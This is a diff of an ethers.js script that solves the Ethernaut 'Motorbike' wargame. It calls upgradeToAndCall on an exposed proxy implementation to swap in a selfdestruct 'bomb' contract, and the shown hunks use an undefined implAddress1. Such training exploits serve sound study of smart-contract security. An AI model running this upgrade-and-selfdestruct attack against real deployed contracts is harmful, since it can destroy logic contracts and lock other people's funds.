@@ -5,7 +5,7 @@ const attackMotorbike = async () => {
     // change contract addresses here.
     const motorbikeAddress = "0xC4BB01C7AA492bdFF60f6989542d71DB7cb73Fd1"; //type "await contract.address()" in ethernaut console
     const playerAddress = "0x3C4f1C7Ab126a94016CA8F4e770522810aa61954";
-    const bombAddress = " 0xF00f8E16b9c6588997a8bdE69e2749a52957d752";
+    const bombAddress = "0xF00f8E16b9c6588997a8bdE69e2749a52957d752";
 
     // Don't touch below
     // Engine contract is vulnerable since you can find the address of the logic implementation.
@@ -56,14 +56,15 @@ const attackMotorbike = async () => {
     const ifaceUpgrade = new ethers.utils.Interface(funcSignUpgrade);
     const upgradeSignature = ifaceUpgrade.encodeFunctionData("upgradeToAndCall", upgradeParams);
 
-    // const upgradeData = "";
+    // changing engine here to our own engine with seldestruct
     const tx1 = await wallet.sendTransaction({
         from: playerAddress,
-        to: implAddress,
+        to: implAddress1,
         data: upgradeSignature,
     });
     const txReceipt1 = await tx1.wait();
     console.log(txReceipt1);
+    console.log("Done...submit in ethernauts");
 };
 
 attackMotorbike()
